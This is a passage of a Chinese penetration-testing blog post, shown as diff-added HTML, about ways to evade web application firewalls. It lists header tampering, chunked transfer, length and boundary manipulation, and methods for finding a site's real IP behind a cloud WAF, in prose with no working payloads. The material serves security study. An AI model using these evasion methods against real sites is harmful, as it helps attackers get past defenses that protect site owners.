class="line">iso-8859-1</span><br><span class="line">iso-8859-13</span><br><span class="line">iso-8859-15</span><br><span class="line">还有其他的方式，其实和上面的思路差不多</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539045.png" alt="图片"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http头部其他绕过，这一块就比较多了，编码，长度等等，都可以试一下，具体的方法和上面的差不多。这里就用参考链接pureqh老哥的几个东西了。</span><br><span class="line">Accept-<span class="keyword">Encoding</span> 改变编码类型</span><br><span class="line">Accept-<span class="keyword">Encoding</span>: gzip</span><br><span class="line">Accept-<span class="keyword">Encoding</span>: compress</span><br><span class="line">Accept-<span class="keyword">Encoding</span>: deflat</span><br><span class="line">eAccept-<span class="keyword">Encoding</span>: br</span><br><span class="line">Accept-<span class="keyword">Encoding</span>: <span class="keyword">identity</span></span><br><span class="line">Accept-<span class="keyword">Encoding</span>: *下面截取的图片是我本次的，就不弄其他的了，长度哪一块，主要是说内容方面相关的。</span><br><span class="line">修改请求方式绕过post改为<span class="keyword">get</span> put等其他的请求方式（这一块主要是针对waf的拦截特性）</span><br><span class="line">host头部绕过</span><br><span class="line">对host进行回车，换行</span><br><span class="line">修改host头部 </span><br><span class="line">host跟链接</span><br><span class="line">host改为<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">删除host</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539037.png" alt="图片"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">到这里就差不多了，再来回头理一下我们的思路。借用露迅先生的一句话，你如果啥都不晓得就莽起整，一些都等求于零。所以我们总结一下我们的思路。</span><br><span class="line">waf的特性大多数是写了很多的规则，基于截取的内容做规则匹配，匹配到了就不放行，未匹配到就认为是安全的放行，所以我们需要做的就是绕过waf对于规则的匹配。大概是这几个方向</span><br><span class="line">（1）基于正则匹配的绕过（也就是参数污染，正则破坏等上面的方法，打乱waf的检测）</span><br><span class="line">（2）基于正则匹配的缺失（类似于修改请求等，让waf根本不去检测这部分的内容）</span><br><span class="line">（3）基于操作系统的特性（类似于后缀名加特殊符号让操作系统进行识别）</span><br><span class="line">我们做一切的前提都是既绕过了waf，也能让后端识别，所以可以乱来，不要太乱。基本也就是污染，多写，绕过，添加删除几个方向。</span><br></pre></td></tr></table></figure>
+
+<h4 id="二-迂回打击"><a href="#二-迂回打击" class="headerlink" title="二 迂回打击"></a>二 迂回打击</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">说是迂回打击，但是其实就是利用一些通用的手段，或者中间件的特性去绕过waf，甚至说寻找到了真实<span class="built_in">ip</span>去直接绕过云waf等方法。这里我就简单总结一些，不全面的话忘体谅。这一块主要是内容相关的了。</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）基于http请求的绕过</span><br><span class="line">这种属于硬怼，方法如下：</span><br><span class="line"><span class="number">1</span>.免杀马这种是万能的，只要能免杀就能如履平地，但是现在的waf规则更新太快了，熬了一夜去弄了个免杀，第二天踩了蜜罐上去就被抓，蓝方产品支持加入规则，一点也不美滋滋，但是这也是一条YYDS的道路</span><br><span class="line"><span class="number">2</span>.分块传输说实话这玩意儿我从来没有成功过，但是面试问的挺多的，有一次有个面试官还专门跟我提了这个所以我这里列举一下。但是分块参数+参数污染组合利用貌似效果还是不错</span><br><span class="line"><span class="number">3</span>.修改长度字段和分块参数有点类似，作用是这样，有些时候做参数大数据污染的时候，waf判断数据过长直接丢弃，有些判断长度和内容相差太多也直接丢弃。这时候可以把两者结合起来使用，达到超长数据绕过waf的检测，同时数据送到了后端</span><br><span class="line"><span class="number">4</span>.修改传输编码和分块传输类似，自己手动去改，<span class="keyword">burp那个插件工具我是一次都没成功过</span></span><br><span class="line"><span class="keyword"></span><span class="number">5</span>.基于网站系统特性添加字段比如ASP专属<span class="keyword">bypass-devcap-charset，添加这些字段去绕过waf的检测（这也是我看到但是没机会实战，记录一下）</span></span><br><span class="line"><span class="keyword"></span><span class="number">6</span>.修改头部+内容结合修改头部为其他格式，再把内容头加其他格式，例如图片，中间插入恶意代码，类似图片马</span><br><span class="line"><span class="number">7</span>.增加多个<span class="keyword">boundary这样子打乱了恶意内容，有点类似分开传输，欺骗waf的检测，逃逸后面的代码。</span></span><br><span class="line"><span class="keyword"></span><span class="number">8</span>.文件名写入文件windows下利用多个&lt;&lt;&lt;&lt;去写入文件，详情可以看参考链接。还有一些其他的方法，这一种也是类似于对waf欺骗，过着直接利用免杀硬过waf的。<span class="keyword">jsp免杀不会，就不献丑免杀了</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">其他绕过</span><br><span class="line">这种绕过就是一般适用于云waf了。咋说呢，这种我碰到的不怎么多，因为一般碰到的云waf基本都很强，注入上传类的绕过现在越来越难了，xss还好一点，但是不走钓鱼的话xss也没用太大的用处，毕竟可以一把梭最舒服。来看看吧，检测全球ping就行。</span><br><span class="line"><span class="number">1</span>.寻找真实<span class="built_in">ip</span>这个方法网上太多了，说下我常用的</span><br><span class="line">（<span class="number">1</span>）利用ssl证书寻找</span><br><span class="line">（<span class="number">2</span>）利用子域名寻找</span><br><span class="line">（<span class="number">3</span>）利用公司其他业务寻找（跑C端看运气，和子域名一样）</span><br><span class="line">（<span class="number">4</span>）利用信息泄露寻找（github，google，目录文件，<span class="keyword">js</span>代码等）</span><br><span class="line">（<span class="number">5</span>）利用一些云网站或者专门查找cdn的网站，链接在家里电脑上，这电脑没有，就自己去找吧</span><br><span class="line">（<span class="number">6</span>）利用已知工具</span><br><span class="line">（<span class="number">7</span>）搜索引擎（fofa，夸克等，看以前收集的业务）</span><br><span class="line">（<span class="number">8</span>）利用http返回信息</span><br><span class="line">（<span class="number">9</span>）找邮箱弱口令，然后你懂的</span><br><span class="line">（<span class="number">10</span>）找朋友，你懂的。</span><br><span class="line"><span class="number">2</span>.利用子域名去打有些网站，可能外面做了防护，子域名没加waf，而子域名又在白名单，迂回去锤就行了。</span><br><span class="line"><span class="number">3</span>.利用头部绕过基本碰不到了，修改host为本地<span class="built_in">ip</span>，现在已经绝迹了，突然想起来写一下。</span><br><span class="line"><span class="number">4</span>.找设备找一些vpn一类的设备碰碰运气其他的就不说了吧，头痛。</span><br><span class="line">总结下这个思路</span><br><span class="line">（<span class="number">1</span>）直接寻找waf保护后的目标地址，进行亲身拥抱（绕过waf去打）</span><br><span class="line">（<span class="number">2</span>）寻找waf后目标的子女子孙亲儿子（被waf加白的一些资产）去挑拨离间。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vaf1tNzpuSFerzqk8M0jLg">https://mp.weixin.qq.com/s/vaf1tNzpuSFerzqk8M0jLg</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/169738">https://www.anquanke.com/post/id/169738</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WVz_i2OJmLoFPeMmp70K9A">https://mp.weixin.qq.com/s/WVz_i2OJmLoFPeMmp70K9A</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/pen4uin/awesome-pentest-note/blob/main/README.md#fastjson-bypass-%E6%9F%90waf">https://github.com/pen4uin/awesome-pentest-note/blob/main/README.md#fastjson-bypass-%E6%9F%90waf</a></p>
+<p><a target="_blank" rel="noopener" href="https://pureqh.top/?p=1225">https://pureqh.top/?p=1225</a></p>
+<p><a target="_blank" rel="noopener" href="https://pureqh.top/?cat=7">https://pureqh.top/?cat=7</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10560">https://xz.aliyun.com/t/10560</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10459">https://xz.aliyun.com/t/10459</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7522">https://xz.aliyun.com/t/7522</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1856256">https://cloud.tencent.com/developer/article/1856256</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag"># web渗透</a>
+              <a href="/tags/waf/" rel="tag"># waf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/26/%E5%AE%89%E5%85%A8%E6%8E%92%E6%9F%A5%E4%B8%8E%E5%88%86%E6%9E%90/" rel="prev" title="安全排查与分析">
+      <i class="fa fa-chevron-left"></i> 安全排查与分析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/03/26/Proxychains+Neo-reGeorg-3.5.0/" rel="next" title="Proxychains  Neo-reGeorg  代理">
+      Proxychains  Neo-reGeorg  代理 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#waf%E5%8E%9F%E7%90%86"><span class="nav-text">waf原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE"><span class="nav-text">一些思维导图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Ewaf%E8%A7%84%E5%88%99%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86"><span class="nav-text">基于waf规则绕过原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E6%8A%97%E8%A7%84%E5%88%99%E7%BB%95%E8%BF%87"><span class="nav-text">对抗规则绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%9B%E8%A1%8C%E4%B8%8D%E5%90%8C%E7%BC%96%E7%A0%81"><span class="nav-text">对关键字进行不同编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%9B%E8%A1%8C%E5%A4%A7%E5%B0%8F%E5%86%99%E5%8F%98%E6%8D%A2"><span class="nav-text">对关键字进行大小写变换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%85%B6%E4%BB%96%E8%AF%AD%E4%B9%89%E7%9B%B8%E5%90%8C%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97%E6%9B%BF%E6%8D%A2"><span class="nav-text">通过其他语义相同的关键字替换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E5%90%88Windows%E7%89%B9%E6%80%A7"><span class="nav-text">配合Windows特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E5%90%88Linux%E7%89%B9%E6%80%A7"><span class="nav-text">配合Linux特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E5%90%88Mysql%E7%89%B9%E6%80%A7"><span class="nav-text">配合Mysql特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E5%90%88%E8%BF%87%E6%BB%A4%E4%BB%A3%E7%A0%81%E6%88%96%E6%BC%8F%E6%B4%9E%E6%9C%AC%E8%BA%AB"><span class="nav-text">配合过滤代码或漏洞本身</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87"><span class="nav-text">http协议绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Content-Type%E7%BB%95%E8%BF%87"><span class="nav-text">Content-Type绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="nav-text">HTTP请求方式绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E7%BB%95%E8%BF%87"><span class="nav-text">参数污染绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87"><span class="nav-text">解析特性绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%9AContent-Disposition%E7%BB%95%E8%BF%87"><span class="nav-text">多Content-Disposition绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E5%85%BC%E5%AE%B9%E6%80%A7%E7%BB%95%E8%BF%87"><span class="nav-text">解析兼容性绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#keep-alive%EF%BC%88Pipeline%EF%BC%89%E7%BB%95%E8%BF%87"><span class="nav-text">keep-alive（Pipeline）绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87"><span class="nav-text">分块传输绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F%EF%BC%9ACharset%E7%BB%95%E8%BF%87"><span class="nav-text">修改编码方式：Charset绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP%E5%8D%8F%E8%AE%AE%E6%9C%AA%E8%A6%86%E7%9B%96"><span class="nav-text">HTTP协议未覆盖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Chunked-%E5%8D%8F%E8%AE%AE%E6%9C%AA%E8%A6%86%E7%9B%96"><span class="nav-text">Chunked+协议未覆盖</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Waf%E6%A3%80%E6%B5%8B%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="nav-text">Waf检测限制绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AB%98%E5%B9%B6%E5%8F%91"><span class="nav-text">高并发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="nav-text">参数溢出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="nav-text">缓冲区溢出</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84%E7%BB%95%E8%BF%87"><span class="nav-text">网络结构绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%90ip%E7%BB%95%E8%BF%87"><span class="nav-text">源ip绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8C%E7%BD%91%E6%AE%B5-x2F-ssrf%E7%BB%95%E8%BF%87"><span class="nav-text">同网段&#x2F;ssrf绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9Bwaf%E7%BB%95%E8%BF%87%E5%AE%9E%E4%BE%8B"><span class="nav-text">一些waf绕过实例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%8B%97"><span class="nav-text">安全狗</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#order-by"><span class="nav-text">order by</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#union-select%E8%AF%AD%E5%8F%A5"><span class="nav-text">union select语句</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#database-%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-text">database()关键字</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%85%B6%E4%BB%96%E7%9A%84%E5%BA%93"><span class="nav-text">获取其他的库</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B6%E5%AE%83%E6%AD%A5%E9%AA%A4"><span class="nav-text">其它步骤</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%87%8D%E5%A4%8D%E6%95%B0%E6%8D%AE-%E5%A4%9A%E6%AC%A1%E5%8F%82%E6%95%B0%E9%87%8D%E5%A4%8D"><span class="nav-text">重复数据(多次参数重复)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA-%E9%98%B2%E5%8C%B9%E9%85%8D-xxx%E2%80%A6"><span class="nav-text">数据溢出-防匹配(xxx…)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-%E6%BA%A2%E5%87%BA"><span class="nav-text">上传绕过-溢出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-%E6%8D%A2%E8%A1%8C%E7%AC%A6"><span class="nav-text">上传绕过-换行符</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB"><span class="nav-text">360主机卫士</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-text">SQL注入绕过-网站后台白名单绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E7%BB%95%E8%BF%87"><span class="nav-text">SQL注入绕过-静态资源绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-%E6%BA%A2%E5%87%BA"><span class="nav-text">SQL注入绕过-溢出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-%E5%8F%82%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="nav-text">SQL注入绕过-参数溢出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-GET-POST"><span class="nav-text">SQL注入绕过-GET+POST</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-0a-%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="nav-text">SQL注入绕过- %0a+内联注释</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text">SQL注入绕过-编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93"><span class="nav-text">SQL注入绕过-分块传输</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-%E6%BA%A2%E5%87%BA-1"><span class="nav-text">上传绕过-溢出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-%E6%8D%A2%E8%A1%8C%E7%AC%A6-1"><span class="nav-text">上传绕过-换行符</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%91%E9%94%81"><span class="nav-text">云锁</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="nav-text">SQL注入绕过-内联注释</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#D%E7%9B%BEwebshell"><span class="nav-text">D盾webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9D%E5%A1%94webshell"><span class="nav-text">宝塔webshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9Bbypass%E6%80%BB%E7%BB%93"><span class="nav-text">一些bypass总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastjson-bypass-%E6%9F%90WAF"><span class="nav-text">fastjson bypass 某WAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9D%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99-Bypass"><span class="nav-text">宝塔防火墙 Bypass</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84bypass"><span class="nav-text">一些中间件的bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E7%BB%95WAF%E6%80%9D%E8%B7%AF"><span class="nav-text">常规绕WAF思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E9%94%99%E8%AF%AF%E7%9A%84HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4"><span class="nav-text">1、错误的HTTP请求头</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E9%80%9A%E7%94%A8%E7%9A%84JAVA%E7%B1%BB%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="nav-text">2、通用的JAVA类关键字绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E4%BD%BF%E7%94%A8%E6%9C%AA%E5%85%AC%E5%BC%80%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">3、使用未公开的漏洞利用链</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Struts2%E8%BF%87WAF"><span class="nav-text">Struts2过WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E4%B8%89%E7%A7%8D%E5%BF%AB%E9%80%9F%E5%88%A4%E6%96%ADstruts2%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">1、三种快速判断struts2的方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81Struts2%E4%B8%AD%E7%9A%84-%E5%92%8C"><span class="nav-text">2、Struts2中的$和%</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87waf"><span class="nav-text">3、如何绕过waf</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Weblogic%E8%BF%87WAF"><span class="nav-text">Weblogic过WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E4%B8%A4%E7%A7%8D%E5%BF%AB%E9%80%9F%E5%88%A4%E6%96%ADWeblogic%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">1、两种快速判断Weblogic的方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87waf"><span class="nav-text">2、如何绕过waf</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF%E6%96%87%E7%AB%A0"><span class="nav-text">一些思路文章</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AF%87"><span class="nav-text">第一篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="nav-text">后缀绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AE%B9%E7%BB%95%E8%BF%87"><span class="nav-text">内容绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E7%BB%95%E8%BF%87"><span class="nav-text">流量绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%AF%87"><span class="nav-text">第二篇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A1%AC%E6%80%BC"><span class="nav-text">硬怼</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C-%E8%BF%82%E5%9B%9E%E6%89%93%E5%87%BB"><span class="nav-text">二 迂回打击</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">apsry</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">apsry</span>
+</div>
